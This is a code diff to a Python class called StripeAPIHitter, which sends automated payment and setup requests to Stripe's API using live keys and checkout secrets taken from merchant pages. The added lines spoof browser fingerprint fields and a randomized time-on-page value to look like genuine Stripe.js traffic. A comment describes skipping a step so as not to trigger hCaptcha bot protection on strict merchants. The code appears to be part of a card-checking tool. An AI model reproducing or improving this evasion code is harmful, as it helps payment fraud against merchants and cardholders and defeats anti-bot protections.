@@ -1017,6 +1017,10 @@ class StripeAPIHitter:
                     "sid": stripe_tokens['sid'],
                     "key": self.pk_live,
                 }
+                
+                if not is_pi and not is_seti and self.cs_live:
+                    pm_data["payment_pages_checkout_session"] = self.cs_live
+
                 # Step 1.5: Algorithm 4 - Stripe Link Enrollment Bypass
                 # [DISABLED] Initiating unverified Link sessions often triggers `rqdata` (hCaptcha) 
                 # bot protection on strict merchants like Foyer Tech. It's safer to skip it.
@@ -1043,7 +1047,13 @@ class StripeAPIHitter:
                 # Stripe-Version header is required — real Stripe.js always sends it; missing it flags non-browser.
                 try:
                     el_type = "setup" if (self.raw_amount is None or self.raw_amount == 0 or is_seti) else "payment"
-                    elements_url = f"https://api.stripe.com/v1/elements/sessions?key={self.pk_live}&locale={locale}&type={el_type}&payment_pages_checkout_session={self.cs_live}"
+                    if is_pi:
+                        qs = f"key={self.pk_live}&locale={locale}&type={el_type}&payment_intent={self.cs_live.split('_secret_')[0]}"
+                    elif is_seti:
+                        qs = f"key={self.pk_live}&locale={locale}&type={el_type}&setup_intent={self.cs_live.split('_secret_')[0]}"
+                    else:
+                        qs = f"key={self.pk_live}&locale={locale}&type={el_type}&payment_pages_checkout_session={self.cs_live}"
+                    elements_url = f"https://api.stripe.com/v1/elements/sessions?{qs}"
                     el_headers = headers.copy()
                     el_headers["referer"] = checkout_page_url
                     el_headers["accept-language"] = accept_lang
@@ -1088,6 +1098,11 @@ class StripeAPIHitter:
                         "expected_payment_method_type": "card",
                         "use_stripe_sdk": "true",
                         "return_url": checkout_page_url,
+                        "guid": stripe_tokens.get('guid', ''),
+                        "muid": stripe_tokens.get('muid', ''),
+                        "sid": stripe_tokens.get('sid', ''),
+                        "payment_user_agent": _payment_user_agent,
+                        "time_on_page": str(random.randint(25000, 45000)),
                         "key": self.pk_live,
                         "client_secret": self.cs_live
                     }
@@ -1109,6 +1124,11 @@ class StripeAPIHitter:
                         "expected_payment_method_type": "card",
                         "use_stripe_sdk": "true",
                         "return_url": checkout_page_url,
+                        "guid": stripe_tokens.get('guid', ''),
+                        "muid": stripe_tokens.get('muid', ''),
+                        "sid": stripe_tokens.get('sid', ''),
+                        "payment_user_agent": _payment_user_agent,
+                        "time_on_page": str(random.randint(25000, 45000)),
                         "key": self.pk_live,
                         "client_secret": self.cs_live
                     }
@@ -1122,6 +1142,11 @@ class StripeAPIHitter:
                         "expected_payment_method_type": "card",
                         "use_stripe_sdk": "true",
                         "consent[terms_of_service]": "accepted",
+                        "guid": stripe_tokens.get('guid', ''),
+                        "muid": stripe_tokens.get('muid', ''),
+                        "sid": stripe_tokens.get('sid', ''),
+                        "payment_user_agent": _payment_user_agent,
+                        "time_on_page": str(random.randint(25000, 45000)),
                         "key": self.pk_live,
                     }
                     if self.raw_amount is not None and self.raw_amount > 0:
